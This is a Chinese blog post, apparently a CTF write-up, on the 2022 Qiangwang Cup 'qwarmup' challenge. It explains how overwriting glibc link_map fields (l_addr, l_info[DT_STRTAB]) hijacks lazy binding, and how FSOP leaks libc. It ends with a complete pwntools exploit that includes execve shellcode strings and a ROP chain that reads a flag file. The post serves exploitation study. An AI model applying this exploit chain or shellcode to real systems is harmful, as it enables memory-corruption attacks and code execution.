---
title: 从qwarmup中学习到关于lazybind和linkmap的利用技巧
date: 2022-08-12 6:54:59 +0800
categories: [ctf比赛]
tags: [pwn, ctf]
permalink: /posts/id=41/
pin: false
---

## 适用场景

适用于Partial Relro时，没有有效的泄露函数，有任意libc地址写且其后会执行未执行过的函数

## 使用方法

主要技巧

1.让绑定错位失效，去修改link_map->l_addr来使得，解析的真实函数地址无法写在got表上(但是函数还是可以正常执行)

2.劫持link_map->l_info[DT_STRTAB]，劫持之前先伪造好strtab(比如在_r_debug上)，原本指向DT_STRTAB的d_val，改其指向DT_DEBUG的d_val

3.执行完记得恢复，让其正常执行原函数功能

## 例题分析:qwarmup

来自2022年强网杯线上赛

![image-20220812170420267](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220812170420267.png)

![image-20220812170535426](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220812170535426.png)

2.35的版本，题目开了沙箱

![image-20220812170503979](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220812170503979.png)

先看下题目情况，题目给了一个4字节的size用于malloc，这里是可以申请到libc段上方

然后是dowhile循环，会取size的高2字节保留，低位2字节赋0，所得的值作为校验，如果不为0就跳出循环。这里如果我们申请的是libc段上方，size就是0x10000往上，就会导致计算所得值不为0，从而跳出循环

而在循环内部，如果我们申请的是libc段上方，那么就可以对libc端任意地址写



题目采用**延迟绑定**的方式执行函数，没有可用于泄露地址的函数

所以考虑劫持stdout泄露地址，但缺少printf族输出函数，可以通过执行`_IO_flush_all`来触发

如果我们改掉该程序本身这个linkmap结构体的link_map->l_addr，就会导致解析完的真实write地址写入的位置发生改变，我们算下偏移，让其写入到0x4088的位置，这样一来，size的高位就为0了

![image-20220812210104272](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220812210104272.png)

由于write的真实地址没有被写进got表，因此每次调用write都会进行一次查找，主要是执行`dl_runtime_resolve`，然后执行`_dl_fixup`函数，其中会去`call _dl_lookup_symnol_x`来获取函数的真实地址

![image-20220812211247119](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220812211247119.png)

第一个参数就是要查找函数的函数名，即`sym->st_name`，其来获取于strtab，strtab则是来源于libc上的全局结构体link_map，link_map->l_info[DT_STRTAB]



这里讲一下linkmap结构

`l_addr`：表示 libary 的基地址

`l_name`：表示 libary 的名字

`l_next`：链接着该程序所有用到的 libary，在GOT[1] 中保存的地址是第一层 link_map 中所表示的 libary，可以用 l_next 结构寻找下一层表示的 libary，以此来遍历程序中所用到的 libary，并利用结构体的字段找到该层 libary 的名字、基地址、以及所有的 section 等信息。

`l_info[x]`：指向该 libary 下的 .dynamic。`l_info[1]` 指向 d_tag = 1 时所表示的 section(这里的Elf64_Dyn结构体) ，所以可以改变 x 的值找到每个相关 section 的地址。在链接过程中 binary 中的 section 地址，以及 libary 中的地址都是通过此方法确定的。

下图是`_rtld_global`中第一个linkmap节点(程序本身)

![image-20220812211717640](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220812211717640.png)

.dynamic节如图所示，是由Elf64_Dyn结构体组成的

![image-20220812212950032](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220812212950032.png)

比如像这样一段

d_tag == DT_STRTAB，d_val == 5 ，d_ptr == 0x560

DT_STRTAB大多都是宏定义，据我观察和dl_val是同样的值

```
Elf64_Dyn <5, 560h>                     ; DT_STRTAB
```

gdb中可以发现其正是指向Elf64_Dyn结构体

![image-20220812220457216](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220812220457216.png)



再说回这个`_dl_lookup_symbol_x`，第一个参数st_name主要就是通过strtab获取的

如果我们修改掉link_map->l_info[DT_STRTAB]的值为另一个可控的Elf64_Dyn结构体的地址，相当于劫持strtab，就可以执行任意函数

```c
_dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,version, ELF_RTYPE_CLASS_PLT, flags, NULL);
```

比如说我们控制link_map->l_info[DT_STRTAB]到DT_DEBUG，这样，我们在write相同偏移处写入IO_flush_all，就能利用lazybinding实现任意函数执行，前提是任意libc地址写，且其后会执行未执行过的函数

![image-20220812211153075](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220812211153075.png)

利用这一点我们可以执行_IO_flush_all函数实现FSOP触发stdout的泄露地址

关于IO_flush_all这个函数呢，主要是调用`_IO_flush_all_lockp`函数，会把IO结构体从stderr开始依次校验(if判断)

拿到libc地址以后，后续就可以通过劫持IO_stderr实现FSOP触发的IO利用，方法很多了，house of cat/house of emma/house of pig等

这里提供一下打本地的exp，远程有一定偏移上的区别

```python
# _*_ coding:utf-8 _*_
from pwn import *
# context.log_level = 'debug'

p = process("./qwarmup")
elf = ELF("./qwarmup")
libc = elf.libc

def dbg(con=''):
    gdb.attach(p,con)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

def write(offset,content):
	for i in range(len(content)):
		p.send(p64(offset+i))
		p.send(content[i])
		p.recvuntil("Success!")

p.send(p32(0xf0000))

write(0x3592d0,"\x70")# 控制覆盖size，同时不让真实地址写入got表

write(0x30e770,p32(0xfbad1800))# IO_stdout
write(0x30e770+0x20+0x8,"\xff")

write(0x359108+0x22,"_IO_flush_all")# 0x22 is offset of write of strtab
p.send(p64(0x359338))
p.send("\xd0")

libc_base=uu64()-0x21ba70
lg('libc_base')

setcontext=libc_base+libc.sym["setcontext"]+61
Read = libc_base+libc.sym["read"]
Write = libc_base+libc.sym['write']
pop_rdi = libc_base+0x2a3e5
pop_rsi = libc_base+0x2be51
pop_rdx = libc_base+0x90529
pop_rcx = libc_base+0x8c6bb
syscall = libc_base+0x91396
pop_rax = libc_base+0x45eb0
heap = libc_base-0xf3ff0
IO_wfile_jumps = libc_base + 0x2160c0
lg('heap')
write(0x359338,"\x90")# recover

#----------------------house of cat by FSOP-----------------------

stderr = libc_base+0x21a6a0# IO_stderr_addr
write(0x30e690+0x28,p64(0xffffffffffffffff))
write(0x30e690+0x40,p64(1))
write(0x30e690+0x50,p64(heap)+p64(setcontext))# rdx
write(0x30e690+0xa0,p64(stderr+0x30))
write(0x30e690+0xd8,p64(IO_wfile_jumps+0x30))
write(0x30e690+0xd8+0x38,p64(stderr+0x40))


rop = p64(heap)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
rop += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap+0x400)+p64(pop_rdx)+p64(0x30)*2+p64(Read)
rop += p64(pop_rdi)+p64(1)+p64(Write)

payload = "flag".ljust(0xa0,'\x00')+p64(heap+0x100)+p64(pop_rdi)
payload = payload.ljust(0x100,'\x00')
payload += rop

write(0,payload)
p.send(p64(0x359338))# IO_flush
p.send("\xd0")

p.interactive()
```



参考文章：

[深入窥探动态链接 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/134105591)

[高版本glibc堆的几种利用手法 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/535469996)

[2022强网杯 Pwn 部分Writeup-Pwn影二つ的博客 (kagehutatsu.com)](https://kagehutatsu.com/?p=723)

[从o开始的pwn学习之超详细ret2dl_resolve_金语的博客-CSDN博客](https://blog.csdn.net/jzc020121/article/details/116312592)

[高级ROP-ret2dlresolve(1) · 语雀 (yuque.com)](https://www.yuque.com/cyberangel/rg9gdm/oyne1i#gGyAO)